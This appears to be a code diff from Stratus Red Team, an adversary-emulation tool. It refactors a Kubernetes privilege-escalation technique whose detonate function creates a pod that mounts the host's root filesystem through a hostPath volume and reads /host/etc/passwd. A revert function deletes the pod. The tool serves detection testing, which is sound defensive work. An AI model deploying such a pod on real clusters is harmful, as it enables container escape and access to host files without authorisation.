@@ -2,6 +2,7 @@ package kubernetes
 
 import (
 	"context"
+	v1 "k8s.io/api/core/v1"
 	"log"
 
 	_ "embed"
@@ -9,50 +10,11 @@ import (
 	"github.com/datadog/stratus-red-team/internal/providers"
 	"github.com/datadog/stratus-red-team/pkg/stratus"
 	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
-	v1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 )
 
 //go:embed main.tf
 var tf []byte
-
-var nodeRootPodSpec = v1.Pod{
-	ObjectMeta: metav1.ObjectMeta{
-		Name:      "k8s.privilege-escalation.hostpath-volume",
-		Namespace: providers.StratusK8sNamespace,
-	},
-	Spec: v1.PodSpec{
-		Containers: []v1.Container{
-			{
-				Name:  "busybox",
-				Image: "busybox:stable",
-				Command: []string{
-					"cat",
-				},
-				Args: []string{
-					"/host/etc/passwd",
-				},
-
-				VolumeMounts: []v1.VolumeMount{
-					{
-						Name:      "hostfs",
-						MountPath: "/host",
-					},
-				},
-			},
-		},
-		Volumes: []v1.Volume{
-			{
-				Name: "hostfs",
-				VolumeSource: v1.VolumeSource{
-					HostPath: &v1.HostPathVolumeSource{
-						Path: "/",
-					},
-				},
-			},
-		},
-	},
-}
 
 func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
@@ -81,11 +43,13 @@ Detonation:
 
 func detonate(params map[string]string) error {
 	client := providers.K8s().GetClient()
+	namespace := params["namespace"]
+	podSpec := nodeRootPodSpec(namespace)
 
-	log.Println("Creating malicious pod: " + nodeRootPodSpec.ObjectMeta.Name)
-	_, err := client.CoreV1().Pods(params["namespace"]).Create(
+	log.Println("Creating malicious pod: " + podSpec.ObjectMeta.Name)
+	_, err := client.CoreV1().Pods(namespace).Create(
 		context.Background(),
-		&nodeRootPodSpec,
+		nodeRootPodSpec(namespace),
 		metav1.CreateOptions{},
 	)
 	log.Println("Pod created")
@@ -95,13 +59,55 @@ func detonate(params map[string]string) error {
 
 func revert(params map[string]string) error {
 	client := providers.K8s().GetClient()
+	namespace := params["namespace"]
+	podSpec := nodeRootPodSpec(namespace)
 
-	log.Println("Removing malicious Pod: " + nodeRootPodSpec.ObjectMeta.Name)
-	err := client.CoreV1().Pods(params["namespace"]).Delete(
+	log.Println("Removing malicious Pod: " + podSpec.ObjectMeta.Name)
+	err := client.CoreV1().Pods(namespace).Delete(
 		context.Background(),
-		nodeRootPodSpec.ObjectMeta.Name,
+		podSpec.ObjectMeta.Name,
 		metav1.DeleteOptions{},
 	)
 
 	return err
+}
+
+func nodeRootPodSpec(namespace string) *v1.Pod {
+	return &v1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "k8s.privilege-escalation.hostpath-volume",
+			Namespace: namespace,
+		},
+		Spec: v1.PodSpec{
+			Containers: []v1.Container{
+				{
+					Name:  "busybox",
+					Image: "busybox:stable",
+					Command: []string{
+						"cat",
+					},
+					Args: []string{
+						"/host/etc/passwd",
+					},
+
+					VolumeMounts: []v1.VolumeMount{
+						{
+							Name:      "hostfs",
+							MountPath: "/host",
+						},
+					},
+				},
+			},
+			Volumes: []v1.Volume{
+				{
+					Name: "hostfs",
+					VolumeSource: v1.VolumeSource{
+						HostPath: &v1.HostPathVolumeSource{
+							Path: "/",
+						},
+					},
+				},
+			},
+		},
+	}
 }
